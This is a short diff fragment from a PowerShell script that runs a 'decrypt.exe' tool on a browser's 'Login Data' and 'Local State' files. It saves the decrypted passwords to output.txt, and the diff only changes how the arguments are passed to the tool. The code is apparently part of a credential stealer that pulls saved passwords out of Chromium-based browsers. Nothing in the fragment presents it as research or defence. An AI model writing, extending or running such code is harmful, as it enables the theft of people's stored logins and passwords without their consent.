@@ -85,8 +85,8 @@ $outputPath = Join-Path -Path $destDir -ChildPath "output.txt"
 if (Test-Path $decryptExePath) {
     if (Test-Path $loginDataPath) {
         if (Test-Path $localStatePath) {
-            # Run the decrypt.exe with both Login Data and Local State
-            & $decryptExePath -1stfile $loginDataPath -2ndfile $localStatePath -output $outputPath
+            # Run the decrypt.exe with specified parameters
+            & $decryptExePath $loginDataPath $localStatePath $outputPath
             
             if (Test-Path $outputPath) {
                 Write-Host "Decrypted passwords saved to: $outputPath"
